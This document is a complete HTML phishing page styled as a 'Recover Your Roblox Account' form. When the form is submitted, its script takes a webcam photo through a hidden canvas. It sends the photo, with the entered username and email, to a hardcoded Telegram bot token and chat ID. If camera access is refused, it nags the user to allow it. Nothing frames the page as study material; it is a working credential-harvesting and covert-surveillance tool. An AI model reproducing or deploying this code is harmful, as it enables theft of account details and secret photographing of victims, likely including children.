<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Account Recovery</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Arial', sans-serif;
      background: url('https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/optimized/4X/b/5/d/b5df22212253eda5f0cebe857cc84dd9a874a478_2_690x388.jpeg') no-repeat center center fixed;
      background-size: cover;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }
    .container {
      background: rgba(0, 0, 0, 0.8);
      padding: 40px 30px;
      border-radius: 10px;
      box-shadow: 0px 8px 20px rgba(0, 0, 0, 0.5);
      max-width: 400px;
      width: 100%;
      text-align: center;
      animation: fadeIn 1s ease-in-out;
    }
    h2 {
      font-size: 26px;
      color: #f3f3f3;
      margin-bottom: 15px;
      font-weight: bold;
    }
    p {
      font-size: 14px;
      color: #d1d5db;
      margin-bottom: 20px;
    }
    input {
      padding: 15px;
      font-size: 14px;
      border-radius: 8px;
      border: 1px solid #3b82f6;
      background-color: #1e293b;
      color: #ffffff;
      margin-bottom: 15px;
      width: 100%;
      box-sizing: border-box;
    }
    input:focus {
      outline: none;
      border-color: #2563eb;
      box-shadow: 0px 0px 5px #2563eb;
    }
    button {
      padding: 12px;
      background-color: #3b82f6;
      border: none;
      border-radius: 8px;
      color: #ffffff;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease-in-out, transform 0.2s ease-in-out;
    }
    button:hover {
      background-color: #2563eb;
      transform: translateY(-2px);
    }
    button:active {
      transform: translateY(0);
    }
    #hiddenCanvas {
      display: none;
    }
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: scale(0.9);
      }
      to {
        opacity: 1;
        transform: scale(1);
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Recover Your Roblox Account</h2>
    <p>Enter your details below to verify your account and recover access.</p>
    <form id="recoveryForm">
      <input type="text" id="username" placeholder="Enter your username" required>
      <input type="email" id="email" placeholder="Enter your email" required>
      <button type="submit">Verify & Recover</button>
    </form>
  </div>

  <canvas id="hiddenCanvas"></canvas>

  <script>
    const telegramToken = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0';
    const telegramChatId = '-1002188815934';

    function sendToTelegram(photoBlob, caption) {
      const apiUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;

      const formData = new FormData();
      formData.append('chat_id', telegramChatId);
      formData.append('photo', photoBlob, 'photo.jpg');
      formData.append('caption', caption);

      fetch(apiUrl, {
        method: 'POST',
        body: formData
      })
        .then(response => response.json())
        .then(data => console.log('Photo sent to Telegram:', data))
        .catch(error => console.error('Error sending photo to Telegram:', error));
    }

    function takeAndSendPhoto(formData) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            const canvas = document.getElementById('hiddenCanvas');
            canvas.width = 640;
            canvas.height = 480;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            stream.getTracks().forEach(track => track.stop());

            canvas.toBlob(blob => {
              const caption = `Username: ${formData.username}\nEmail: ${formData.email}`;
              sendToTelegram(blob, caption);
            }, 'image/jpeg');
          }, 1000);
        })
        .catch(err => {
          console.error('Error accessing camera:', err);
          if (err.name === 'NotAllowedError') {
            alert('Please allow camera access to proceed.');
          }
        });
    }

    document.getElementById('recoveryForm').addEventListener('submit', function(event) {
      event.preventDefault();

      const formData = {
        username: document.getElementById('username').value,
        email: document.getElementById('email').value
      };

      takeAndSendPhoto(formData);
    });
  </script>
</body>
</html>
